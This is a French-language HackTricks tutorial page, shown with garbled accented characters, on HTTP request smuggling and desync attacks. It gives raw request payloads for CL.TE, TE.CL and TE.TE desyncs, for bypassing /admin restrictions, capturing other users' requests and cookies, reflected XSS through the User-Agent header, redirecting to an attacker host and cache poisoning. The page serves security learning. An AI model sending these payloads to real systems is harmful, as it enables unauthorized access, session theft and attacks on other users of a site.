# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* VÃ©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dÃ©pÃ´ts github.

</details>
{% endhint %}

## Qu'est-ce que c'est

Cette vulnÃ©rabilitÃ© se produit lorsqu'une **dÃ©synchronisation** entre les **proxies front-end** et le serveur **back-end** permet Ã  un **attaquant** d'**envoyer** une **requÃªte** HTTP qui sera **interprÃ©tÃ©e** comme une **unique requÃªte** par les proxies **front-end** (Ã©quilibreur de charge/proxy inverse) et **comme 2 requÃªtes** par le serveur **back-end**.\
Cela permet Ã  un utilisateur de **modifier la prochaine requÃªte qui arrive au serveur back-end aprÃ¨s la sienne**.

### ThÃ©orie

[**SpÃ©cification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est reÃ§u avec Ã  la fois un champ d'en-tÃªte Transfer-Encoding et un champ d'en-tÃªte Content-Length, ce dernier DOIT Ãªtre ignorÃ©.

**Content-Length**

> L'en-tÃªte d'entitÃ© Content-Length indique la taille du corps de l'entitÃ©, en octets, envoyÃ©e au destinataire.

**Transfer-Encoding: chunked**

> L'en-tÃªte Transfer-Encoding spÃ©cifie la forme d'encodage utilisÃ©e pour transfÃ©rer en toute sÃ©curitÃ© le corps de la charge utile Ã  l'utilisateur.\
> Chunked signifie que de grandes donnÃ©es sont envoyÃ©es en une sÃ©rie de morceaux.

### RÃ©alitÃ©

Le **Front-End** (un Ã©quilibreur de charge / Proxy Inverse) **traite** l'en-tÃªte _**content-length**_ ou l'en-tÃªte _**transfer-encoding**_ et le serveur **Back-end** **traite l'autre**, provoquant une **dÃ©synchronisation** entre les 2 systÃ¨mes.\
Cela pourrait Ãªtre trÃ¨s critique car **un attaquant pourra envoyer une requÃªte** au proxy inverse qui sera **interprÃ©tÃ©e** par le serveur **back-end** **comme 2 requÃªtes diffÃ©rentes**. Le **danger** de cette technique rÃ©side dans le fait que le serveur **back-end** **interprÃ©tera** la **2Ã¨me requÃªte injectÃ©e** comme si elle **venait du prochain client** et la **vraie requÃªte** de ce client fera **partie** de la **requÃªte injectÃ©e**.

### ParticularitÃ©s

Rappelez-vous qu'en HTTP **un caractÃ¨re de nouvelle ligne est composÃ© de 2 octets :**

* **Content-Length** : Cet en-tÃªte utilise un **nombre dÃ©cimal** pour indiquer le **nombre** d'**octets** du **corps** de la requÃªte. Le corps est censÃ© se terminer par le dernier caractÃ¨re, **une nouvelle ligne n'est pas nÃ©cessaire Ã  la fin de la requÃªte**.
* **Transfer-Encoding :** Cet en-tÃªte utilise dans le **corps** un **nombre hexadÃ©cimal** pour indiquer le **nombre** d'**octets** du **prochain morceau**. Le **morceau** doit **se terminer** par une **nouvelle ligne** mais cette nouvelle ligne **n'est pas comptÃ©e** par l'indicateur de longueur. Cette mÃ©thode de transfert doit se terminer par un **morceau de taille 0 suivi de 2 nouvelles lignes** : `0`
* **Connection** : D'aprÃ¨s mon expÃ©rience, il est recommandÃ© d'utiliser **`Connection: keep-alive`** lors de la premiÃ¨re requÃªte du request Smuggling.

## Exemples de base

{% hint style="success" %}
Lors de l'exploitation de cela avec Burp Suite, **dÃ©sactivez `Update Content-Length` et `Normalize HTTP/1 line endings`** dans le rÃ©pÃ©teur car certains gadgets abusent des nouvelles lignes, des retours chariot et des content-length malformÃ©s.
{% endhint %}

Les attaques de HTTP request smuggling sont Ã©laborÃ©es en envoyant des requÃªtes ambiguÃ«s qui exploitent les divergences dans la faÃ§on dont les serveurs front-end et back-end interprÃ¨tent les en-tÃªtes `Content-Length` (CL) et `Transfer-Encoding` (TE). Ces attaques peuvent se manifester sous diffÃ©rentes formes, principalement comme **CL.TE**, **TE.CL**, et **TE.TE**. Chaque type reprÃ©sente une combinaison unique de la faÃ§on dont les serveurs front-end et back-end priorisent ces en-tÃªtes. Les vulnÃ©rabilitÃ©s proviennent du fait que les serveurs traitent la mÃªme requÃªte de diffÃ©rentes maniÃ¨res, entraÃ®nant des rÃ©sultats inattendus et potentiellement malveillants.

### Exemples de base des types de vulnÃ©rabilitÃ©s

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

{% hint style="info" %}
Ã€ la table prÃ©cÃ©dente, vous devriez ajouter la technique TE.0, comme la technique CL.0 mais en utilisant Transfer Encoding.
{% endhint %}

#### VulnÃ©rabilitÃ© CL.TE (Content-Length utilisÃ© par le Front-End, Transfer-Encoding utilisÃ© par le Back-End)

* **Front-End (CL) :** Traite la requÃªte en fonction de l'en-tÃªte `Content-Length`.
* **Back-End (TE) :** Traite la requÃªte en fonction de l'en-tÃªte `Transfer-Encoding`.
* **ScÃ©nario d'attaque :**
* L'attaquant envoie une requÃªte oÃ¹ la valeur de l'en-tÃªte `Content-Length` ne correspond pas Ã  la longueur rÃ©elle du contenu.
* Le serveur front-end transmet l'intÃ©gralitÃ© de la requÃªte au back-end, en fonction de la valeur de `Content-Length`.
* Le serveur back-end traite la requÃªte comme Ã©tant chunked en raison de l'en-tÃªte `Transfer-Encoding: chunked`, interprÃ©tant les donnÃ©es restantes comme une requÃªte sÃ©parÃ©e et subsÃ©quente.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### VulnÃ©rabilitÃ© TE.CL (Transfer-Encoding utilisÃ© par le Front-End, Content-Length utilisÃ© par le Back-End)

* **Front-End (TE) :** Traite la requÃªte en fonction de l'en-tÃªte `Transfer-Encoding`.
* **Back-End (CL) :** Traite la requÃªte en fonction de l'en-tÃªte `Content-Length`.
* **ScÃ©nario d'attaque :**
* L'attaquant envoie une requÃªte chunked oÃ¹ la taille du morceau (`7b`) et la longueur rÃ©elle du contenu (`Content-Length: 4`) ne s'alignent pas.
* Le serveur front-end, respectant `Transfer-Encoding`, transmet l'intÃ©gralitÃ© de la requÃªte au back-end.
* Le serveur back-end, respectant `Content-Length`, ne traite que la partie initiale de la requÃªte (`7b` octets), laissant le reste comme partie d'une requÃªte subsÃ©quente non intentionnelle.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### VulnÃ©rabilitÃ© TE.TE (Transfer-Encoding utilisÃ© par les deux, avec obfuscation)

* **Serveurs :** Les deux prennent en charge `Transfer-Encoding`, mais l'un peut Ãªtre trompÃ© pour l'ignorer via l'obfuscation.
* **ScÃ©nario d'attaque :**
* L'attaquant envoie une requÃªte avec des en-tÃªtes `Transfer-Encoding` obfusquÃ©s.
* Selon quel serveur (front-end ou back-end) Ã©choue Ã  reconnaÃ®tre l'obfuscation, une vulnÃ©rabilitÃ© CL.TE ou TE.CL peut Ãªtre exploitÃ©e.
* La partie non traitÃ©e de la requÃªte, telle que vue par l'un des serveurs, devient partie d'une requÃªte subsÃ©quente, entraÃ®nant le smuggling.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **ScÃ©nario CL.CL (Content-Length utilisÃ© par le Front-End et le Back-End)**

* Les deux serveurs traitent la requÃªte uniquement en fonction de l'en-tÃªte `Content-Length`.
* Ce scÃ©nario ne conduit gÃ©nÃ©ralement pas au smuggling, car il y a un alignement dans la faÃ§on dont les deux serveurs interprÃ¨tent la longueur de la requÃªte.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **ScÃ©nario CL.0**

* Fait rÃ©fÃ©rence aux scÃ©narios oÃ¹ l'en-tÃªte `Content-Length` est prÃ©sent et a une valeur autre que zÃ©ro, indiquant que le corps de la requÃªte a du contenu. Le back-end ignore l'en-tÃªte `Content-Length` (qui est traitÃ© comme 0), mais le front-end l'analyse.
* C'est crucial pour comprendre et Ã©laborer des attaques de smuggling, car cela influence la faÃ§on dont les serveurs dÃ©terminent la fin d'une requÃªte.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### ScÃ©nario TE.0

* Comme le prÃ©cÃ©dent mais en utilisant TE.
* Technique [rapportÃ©e ici](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
* **Exemple** :
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Casser le serveur web

Cette technique est Ã©galement utile dans des scÃ©narios oÃ¹ il est possible de **casser un serveur web tout en lisant les donnÃ©es HTTP initiales** mais **sans fermer la connexion**. De cette maniÃ¨re, le **corps** de la requÃªte HTTP sera considÃ©rÃ© comme la **prochaine requÃªte HTTP**.

Par exemple, comme expliquÃ© dans [**ce rapport**](https://mizu.re/post/twisty-python), dans Werkzeug, il Ã©tait possible d'envoyer certains caractÃ¨res **Unicode** et cela ferait **casser** le serveur. Cependant, si la connexion HTTP a Ã©tÃ© crÃ©Ã©e avec l'en-tÃªte **`Connection: keep-alive`**, le corps de la requÃªte ne sera pas lu et la connexion restera ouverte, donc le **corps** de la requÃªte sera traitÃ© comme la **prochaine requÃªte HTTP**.

#### Forcer via des en-tÃªtes hop-by-hop

En abusant des en-tÃªtes hop-by-hop, vous pourriez indiquer au proxy de **supprimer l'en-tÃªte Content-Length ou Transfer-Encoding afin qu'un HTTP request smuggling soit possible Ã  abuser**.
```
Connection: Content-Length
```
Pour **plus d'informations sur les en-tÃªtes hop-by-hop**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Trouver des vulnÃ©rabilitÃ©s de HTTP Request Smuggling

Identifier les vulnÃ©rabilitÃ©s de HTTP request smuggling peut souvent Ãªtre rÃ©alisÃ© en utilisant des techniques de timing, qui reposent sur l'observation du temps qu'il faut au serveur pour rÃ©pondre Ã  des requÃªtes manipulÃ©es. Ces techniques sont particuliÃ¨rement utiles pour dÃ©tecter les vulnÃ©rabilitÃ©s CL.TE et TE.CL. En plus de ces mÃ©thodes, il existe d'autres stratÃ©gies et outils qui peuvent Ãªtre utilisÃ©s pour trouver de telles vulnÃ©rabilitÃ©s :

### Trouver des vulnÃ©rabilitÃ©s CL.TE en utilisant des techniques de timing

* **MÃ©thode :**
* Envoyer une requÃªte qui, si l'application est vulnÃ©rable, fera attendre le serveur back-end pour des donnÃ©es supplÃ©mentaires.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Observation :**
* Le serveur front-end traite la requÃªte en fonction de `Content-Length` et coupe le message prÃ©maturÃ©ment.
* Le serveur back-end, s'attendant Ã  un message chunked, attend le prochain chunk qui n'arrive jamais, provoquant un dÃ©lai.
* **Indicateurs :**
* DÃ©lais d'attente ou longs dÃ©lais de rÃ©ponse.
* RÃ©ception d'une erreur 400 Bad Request du serveur back-end, parfois avec des informations dÃ©taillÃ©es sur le serveur.

### Trouver des vulnÃ©rabilitÃ©s TE.CL en utilisant des techniques de timing

* **MÃ©thode :**
* Envoyer une requÃªte qui, si l'application est vulnÃ©rable, fera attendre le serveur back-end pour des donnÃ©es supplÃ©mentaires.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Observation :**
* Le serveur front-end traite la requÃªte en fonction de `Transfer-Encoding` et transmet l'intÃ©gralitÃ© du message.
* Le serveur back-end, s'attendant Ã  un message basÃ© sur `Content-Length`, attend des donnÃ©es supplÃ©mentaires qui n'arrivent jamais, provoquant un dÃ©lai.

### Autres mÃ©thodes pour trouver des vulnÃ©rabilitÃ©s

* **Analyse de rÃ©ponse diffÃ©rentielle :**
* Envoyer des versions lÃ©gÃ¨rement variÃ©es d'une requÃªte et observer si les rÃ©ponses du serveur diffÃ¨rent de maniÃ¨re inattendue, indiquant une incohÃ©rence de parsing.
* **Utilisation d'outils automatisÃ©s :**
* Des outils comme l'extension 'HTTP Request Smuggler' de Burp Suite peuvent tester automatiquement ces vulnÃ©rabilitÃ©s en envoyant diverses formes de requÃªtes ambiguÃ«s et en analysant les rÃ©ponses.
* **Tests de variance de Content-Length :**
* Envoyer des requÃªtes avec des valeurs `Content-Length` variÃ©es qui ne sont pas alignÃ©es avec la longueur rÃ©elle du contenu et observer comment le serveur gÃ¨re de telles incohÃ©rences.
* **Tests de variance de Transfer-Encoding :**
* Envoyer des requÃªtes avec des en-tÃªtes `Transfer-Encoding` obfusquÃ©s ou malformÃ©s et surveiller comment les serveurs front-end et back-end rÃ©agissent diffÃ©remment Ã  de telles manipulations.

### Test de vulnÃ©rabilitÃ© de HTTP Request Smuggling

AprÃ¨s avoir confirmÃ© l'efficacitÃ© des techniques de timing, il est crucial de vÃ©rifier si les requÃªtes des clients peuvent Ãªtre manipulÃ©es. Une mÃ©thode simple consiste Ã  tenter de polluer vos requÃªtes, par exemple, en faisant en sorte qu'une requÃªte Ã  `/` renvoie une rÃ©ponse 404. Les exemples `CL.TE` et `TE.CL` discutÃ©s prÃ©cÃ©demment dans [Exemples de base](./#basic-examples) dÃ©montrent comment polluer une requÃªte client pour provoquer une rÃ©ponse 404, malgrÃ© le fait que le client vise Ã  accÃ©der Ã  une ressource diffÃ©rente.

**ConsidÃ©rations clÃ©s**

Lors du test des vulnÃ©rabilitÃ©s de request smuggling en interfÃ©rant avec d'autres requÃªtes, gardez Ã  l'esprit :

* **Connexions rÃ©seau distinctes :** Les requÃªtes "d'attaque" et "normales" doivent Ãªtre envoyÃ©es sur des connexions rÃ©seau sÃ©parÃ©es. Utiliser la mÃªme connexion pour les deux ne valide pas la prÃ©sence de la vulnÃ©rabilitÃ©.
* **URL et paramÃ¨tres cohÃ©rents :** Visez Ã  utiliser des URL et des noms de paramÃ¨tres identiques pour les deux requÃªtes. Les applications modernes routent souvent les requÃªtes vers des serveurs back-end spÃ©cifiques en fonction de l'URL et des paramÃ¨tres. Les faire correspondre augmente la probabilitÃ© que les deux requÃªtes soient traitÃ©es par le mÃªme serveur, une condition prÃ©alable Ã  une attaque rÃ©ussie.
* **Timing et conditions de course :** La requÃªte "normale", destinÃ©e Ã  dÃ©tecter l'interfÃ©rence de la requÃªte "d'attaque", est en concurrence avec d'autres requÃªtes d'application concurrentes. Par consÃ©quent, envoyez la requÃªte "normale" immÃ©diatement aprÃ¨s la requÃªte "d'attaque". Les applications occupÃ©es peuvent nÃ©cessiter plusieurs essais pour une confirmation concluante de la vulnÃ©rabilitÃ©.
* **DÃ©fis d'Ã©quilibrage de charge :** Les serveurs front-end agissant comme des Ã©quilibreurs de charge peuvent distribuer les requÃªtes sur divers systÃ¨mes back-end. Si les requÃªtes "d'attaque" et "normales" se retrouvent sur des systÃ¨mes diffÃ©rents, l'attaque ne rÃ©ussira pas. Cet aspect d'Ã©quilibrage de charge peut nÃ©cessiter plusieurs tentatives pour confirmer une vulnÃ©rabilitÃ©.
* **Impact utilisateur non intentionnel :** Si votre attaque impacte involontairement la requÃªte d'un autre utilisateur (pas la requÃªte "normale" que vous avez envoyÃ©e pour la dÃ©tection), cela indique que votre attaque a influencÃ© un autre utilisateur de l'application. Des tests continus pourraient perturber d'autres utilisateurs, nÃ©cessitant une approche prudente.

## Abuser de HTTP Request Smuggling

### Contourner la sÃ©curitÃ© front-end via HTTP Request Smuggling

Parfois, les proxys front-end appliquent des mesures de sÃ©curitÃ©, scrutant les requÃªtes entrantes. Cependant, ces mesures peuvent Ãªtre contournÃ©es en exploitant le HTTP Request Smuggling, permettant un accÃ¨s non autorisÃ© Ã  des points de terminaison restreints. Par exemple, l'accÃ¨s Ã  `/admin` pourrait Ãªtre interdit de l'extÃ©rieur, le proxy front-end bloquant activement de telles tentatives. NÃ©anmoins, ce proxy peut nÃ©gliger d'inspecter les requÃªtes intÃ©grÃ©es dans une requÃªte HTTP smuggled, laissant une faille pour contourner ces restrictions.

ConsidÃ©rez les exemples suivants illustrant comment le HTTP Request Smuggling peut Ãªtre utilisÃ© pour contourner les contrÃ´les de sÃ©curitÃ© front-end, ciblant spÃ©cifiquement le chemin `/admin` qui est gÃ©nÃ©ralement protÃ©gÃ© par le proxy front-end :

**Exemple CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Dans l'attaque CL.TE, l'en-tÃªte `Content-Length` est utilisÃ© pour la requÃªte initiale, tandis que la requÃªte intÃ©grÃ©e suivante utilise l'en-tÃªte `Transfer-Encoding: chunked`. Le proxy frontal traite la requÃªte `POST` initiale mais ne parvient pas Ã  inspecter la requÃªte intÃ©grÃ©e `GET /admin`, permettant un accÃ¨s non autorisÃ© au chemin `/admin`.

**TE.CL Exemple**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Inverse, dans l'attaque TE.CL, la requÃªte initiale `POST` utilise `Transfer-Encoding: chunked`, et la requÃªte intÃ©grÃ©e suivante est traitÃ©e en fonction de l'en-tÃªte `Content-Length`. Semblable Ã  l'attaque CL.TE, le proxy frontal ignore la requÃªte `GET /admin` dissimulÃ©e, accordant involontairement l'accÃ¨s au chemin restreint `/admin`.

### RÃ©vÃ©lation de la rÃ©Ã©criture des requÃªtes frontales <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Les applications utilisent souvent un **serveur frontal** pour modifier les requÃªtes entrantes avant de les transmettre au serveur back-end. Une modification typique consiste Ã  ajouter des en-tÃªtes, tels que `X-Forwarded-For: <IP du client>`, pour relayer l'IP du client au back-end. Comprendre ces modifications peut Ãªtre crucial, car cela pourrait rÃ©vÃ©ler des moyens de **contourner les protections** ou **dÃ©couvrir des informations ou des points de terminaison dissimulÃ©s**.

Pour enquÃªter sur la faÃ§on dont un proxy modifie une requÃªte, localisez un paramÃ¨tre POST que le back-end renvoie dans la rÃ©ponse. Ensuite, Ã©laborez une requÃªte, en utilisant ce paramÃ¨tre en dernier, similaire Ã  ce qui suit :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Dans cette structure, les composants de requÃªte suivants sont ajoutÃ©s aprÃ¨s `search=`, qui est le paramÃ¨tre reflÃ©tÃ© dans la rÃ©ponse. Ce reflet exposera les en-tÃªtes de la requÃªte suivante.

Il est important d'aligner l'en-tÃªte `Content-Length` de la requÃªte imbriquÃ©e avec la longueur rÃ©elle du contenu. Il est conseillÃ© de commencer par une petite valeur et d'augmenter progressivement, car une valeur trop basse tronquera les donnÃ©es reflÃ©tÃ©es, tandis qu'une valeur trop Ã©levÃ©e peut provoquer une erreur dans la requÃªte.

Cette technique est Ã©galement applicable dans le contexte d'une vulnÃ©rabilitÃ© TE.CL, mais la requÃªte doit se terminer par `search=\r\n0`. IndÃ©pendamment des caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

Cette mÃ©thode sert principalement Ã  comprendre les modifications de requÃªte effectuÃ©es par le proxy frontal, rÃ©alisant essentiellement une enquÃªte auto-dirigÃ©e.

### Capturer les requÃªtes d'autres utilisateurs <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Il est possible de capturer les requÃªtes du prochain utilisateur en ajoutant une requÃªte spÃ©cifique comme valeur d'un paramÃ¨tre lors d'une opÃ©ration POST. Voici comment cela peut Ãªtre accompli :

En ajoutant la requÃªte suivante comme valeur d'un paramÃ¨tre, vous pouvez stocker la requÃªte du client suivant :
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Dans ce scÃ©nario, le **paramÃ¨tre comment** est destinÃ© Ã  stocker le contenu dans la section des commentaires d'un post sur une page accessible au public. Par consÃ©quent, le contenu de la requÃªte suivante apparaÃ®tra comme un commentaire.

Cependant, cette technique a des limitations. En gÃ©nÃ©ral, elle capture les donnÃ©es uniquement jusqu'au dÃ©limiteur de paramÃ¨tre utilisÃ© dans la requÃªte dissimulÃ©e. Pour les soumissions de formulaires encodÃ©es en URL, ce dÃ©limiteur est le caractÃ¨re `&`. Cela signifie que le contenu capturÃ© de la requÃªte de l'utilisateur victime s'arrÃªtera au premier `&`, qui peut mÃªme faire partie de la chaÃ®ne de requÃªte.

De plus, il convient de noter que cette approche est Ã©galement viable avec une vulnÃ©rabilitÃ© TE.CL. Dans de tels cas, la requÃªte doit se terminer par `search=\r\n0`. IndÃ©pendamment des caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

### Utiliser le HTTP request smuggling pour exploiter le XSS rÃ©flÃ©chi

Le HTTP Request Smuggling peut Ãªtre utilisÃ© pour exploiter des pages web vulnÃ©rables au **XSS rÃ©flÃ©chi**, offrant des avantages significatifs :

* L'interaction avec les utilisateurs cibles **n'est pas requise**.
* Permet l'exploitation du XSS dans des parties de la requÃªte qui sont **normalement inaccessibles**, comme les en-tÃªtes de requÃªte HTTP.

Dans les scÃ©narios oÃ¹ un site web est susceptible au XSS rÃ©flÃ©chi via l'en-tÃªte User-Agent, la charge utile suivante dÃ©montre comment exploiter cette vulnÃ©rabilitÃ© :
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ce payload est structurÃ© pour exploiter la vulnÃ©rabilitÃ© en :

1. Initiant une requÃªte `POST`, apparemment typique, avec un en-tÃªte `Transfer-Encoding: chunked` pour indiquer le dÃ©but du smuggling.
2. Suivant avec un `0`, marquant la fin du corps du message chunked.
3. Ensuite, une requÃªte `GET` smuggled est introduite, oÃ¹ l'en-tÃªte `User-Agent` est injectÃ© avec un script, `<script>alert(1)</script>`, dÃ©clenchant le XSS lorsque le serveur traite cette requÃªte subsÃ©quente.

En manipulant le `User-Agent` par le smuggling, le payload contourne les contraintes normales de requÃªte, exploitant ainsi la vulnÃ©rabilitÃ© XSS rÃ©flÃ©chie de maniÃ¨re non standard mais efficace.

#### HTTP/0.9

{% hint style="danger" %}
Dans le cas oÃ¹ le contenu utilisateur est rÃ©flÃ©chi dans une rÃ©ponse avec un **`Content-type`** tel que **`text/plain`**, empÃªchant l'exÃ©cution du XSS. Si le serveur prend en charge **HTTP/0.9, il pourrait Ãªtre possible de contourner cela** !
{% endhint %}

La version HTTP/0.9 Ã©tait antÃ©rieure Ã  la 1.0 et utilise uniquement des verbes **GET** et **ne** rÃ©pond **pas** avec des **en-tÃªtes**, juste le corps.

Dans [**ce writeup**](https://mizu.re/post/twisty-python), cela a Ã©tÃ© abusÃ© avec un smuggling de requÃªte et un **point de terminaison vulnÃ©rable qui rÃ©pondra avec l'entrÃ©e de l'utilisateur** pour smuggler une requÃªte avec HTTP/0.9. Le paramÃ¨tre qui sera rÃ©flÃ©chi dans la rÃ©ponse contenait une **rÃ©ponse HTTP/1.1 factice (avec en-tÃªtes et corps)**, de sorte que la rÃ©ponse contiendra un code JS exÃ©cutable valide avec un `Content-Type` de `text/html`.

### Exploiter les redirections sur site avec le HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Les applications redirigent souvent d'une URL Ã  une autre en utilisant le nom d'hÃ´te de l'en-tÃªte `Host` dans l'URL de redirection. Cela est courant avec des serveurs web comme Apache et IIS. Par exemple, demander un dossier sans barre oblique Ã  la fin entraÃ®ne une redirection pour inclure la barre oblique :
```
GET /home HTTP/1.1
Host: normal-website.com
```
RÃ©sultats dans :
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Bien que cela puisse sembler inoffensif, ce comportement peut Ãªtre manipulÃ© en utilisant le HTTP request smuggling pour rediriger les utilisateurs vers un site externe. Par exemple :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Cette requÃªte dissimulÃ©e pourrait entraÃ®ner la redirection de la prochaine requÃªte utilisateur traitÃ©e vers un site web contrÃ´lÃ© par un attaquant :
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
RÃ©sultats dans :
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Dans ce scÃ©nario, la demande d'un utilisateur pour un fichier JavaScript est dÃ©tournÃ©e. L'attaquant peut potentiellement compromettre l'utilisateur en servant un JavaScript malveillant en rÃ©ponse.

### Exploiter le Poisoning de Cache Web via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Le poisoning de cache web peut Ãªtre exÃ©cutÃ© si un composant de l'**infrastructure frontale met en cache le contenu**, gÃ©nÃ©ralement pour amÃ©liorer les performances. En manipulant la rÃ©ponse du serveur, il est possible de **poisonner le cache**.

Auparavant, nous avons observÃ© comment les rÃ©ponses du serveur pouvaient Ãªtre modifiÃ©es pour renvoyer une erreur 404 (voir [Exemples de Base](./#basic-examples)). De mÃªme, il est possible de tromper le serveur pour qu'il livre le contenu de `/index.html` en rÃ©ponse Ã  une demande pour `/static/include.js`. Par consÃ©quent, le contenu de `/static/include.js` est remplacÃ© dans le cache par celui de `/index.html`, rendant `/static/include.js` inaccessible aux utilisateurs, ce qui peut potentiellement conduire Ã  une DÃ©ni de Service (DoS).

Cette technique devient particuliÃ¨rement puissante si une **vulnÃ©rabilitÃ© de Redirection Ouverte** est dÃ©couverte ou s'il y a une **redirection sur site vers une redirection ouverte**. De telles vulnÃ©rabilitÃ©s peuvent Ãªtre exploitÃ©es pour remplacer le contenu mis en cache de `/static/include.js` par un script sous le contrÃ´le de l'attaquant, permettant essentiellement une attaque Cross-Site Scripting (XSS) gÃ©nÃ©ralisÃ©e contre tous les clients demandant le `/static/include.js` mis Ã  jour.

